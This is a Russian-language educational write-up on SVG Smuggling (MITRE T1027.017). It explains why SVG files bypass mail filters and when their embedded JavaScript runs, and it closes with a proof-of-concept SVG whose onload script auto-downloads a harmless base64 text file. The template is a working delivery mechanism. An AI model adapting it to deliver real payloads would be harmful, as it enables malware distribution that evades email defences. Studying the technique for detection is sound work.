## 1. Введение и суть техники

**SVG Smuggling** ([T1027.017](https://attack.mitre.org/techniques/T1027/017/))— это разновидность техники HTML Smuggling, при которой доставка полезной нагрузки на устройство пользователя осуществляется через файлы векторной графики **SVG**.

### Причины популярности техники:

- **Особенности формата**: В отличие от растровых изображений (`.png`, `.jpg`), формат SVG представляет собой **XML-документ**. Согласно спецификациям W3C, внутри SVG разрешено использование элементов `<script>` и выполнение полноценного JavaScript-кода.
- **Обход почтовых фильтров**: Почтовые шлюзы и сетевые экраны часто классифицируют файлы `.svg` как безопасные медиафайлы (`image/svg+xml`), пропуская их в случаях, когда файлы `.html` или `.js` блокируются.

## 2. Механизм работы

### Контексты исполнения JavaScript в SVG

Запуск встроенного скрипта в браузерах полностью зависит от того, **как именно файл SVG внедрен или открыт**:

> [!TIP]
> **Исполнение разрешено (Скрипты выполняются):**
> 
> - **Прямое открытие / Открытие файла в новой вкладке**: Браузер обрабатывает SVG как самостоятельный XML-документ со стандартной поддержкой выполнения скриптов.
> - **Внедрение через `<object>`, `<iframe>`, `<embed>`**: Встроенный документ сохраняет интерактивность и доступ к выполнению кода.

> [!CAUTION]
> **Исполнение заблокировано (Скрипты не выполняются):**
> 
> - **Тег `<img src="file.svg">`**: В целях безопасности современные браузеры отключают исполнение JavaScript при отображении изображения через `<img>`.
> - **CSS `background-image: url(file.svg)`**: Выполнение любых скриптов полностью заблокировано движком браузера.

### Особенности DOM в SVG-документе

При написании скриптов доставки внутри SVG учитываются следующие спецификации:

1. **Отсутствие тега `<body>`**: Корневым элементом является `<svg>`, поэтому обращения к `document.body` вернут `null`. Все создаваемые элементы добавляются в `document.documentElement`.
2. **Пространства имен (XHTML Namespace)**: Элемент ссылки `<a>` для скачивания создается через `document.createElementNS("http://www.w3.org/1999/xhtml", "a")`, чтобы браузер корректно обработал атрибут `download`.

## 3. Концептуальное воспроизведение (Учебный PoC)

Ниже приведен безопасный демонстрационный svg-файл, который содержит визуальную графику и скрипт, формирующий текстовый файл `payload_from_svg.txt` из оперативной памяти.

![](<data/Pasted image 20260907201156.png>)

```svg
<svg xmlns="http://www.w3.org/2000/svg" width="500" height="200" viewBox="0 0 500 200">
    <rect width="100%" height="100%" fill="#1e1e2e" rx="10" />
    <text x="50%" y="50%" fill="#cba6f7" dominant-baseline="middle" text-anchor="middle" font-family="sans-serif" font-size="18">
        Демонстрация техники SVG Smuggling
    </text>

    <script type="text/javascript">
        let done = false;
        function download() {
            if (done) return; done = true;
            const a = document.createElementNS("http://www.w3.org/1999/xhtml", "a");
            a.href = "data:application/octet-stream;base64,SGVsbG8sIFNWRyBTbXVnZ2xpbmch"; 
            a.download = "payload_from_svg.txt"; 
            
            document.documentElement.appendChild(a);
            a.click();
        }
        window.onload = download;
    </script>
</svg>
```
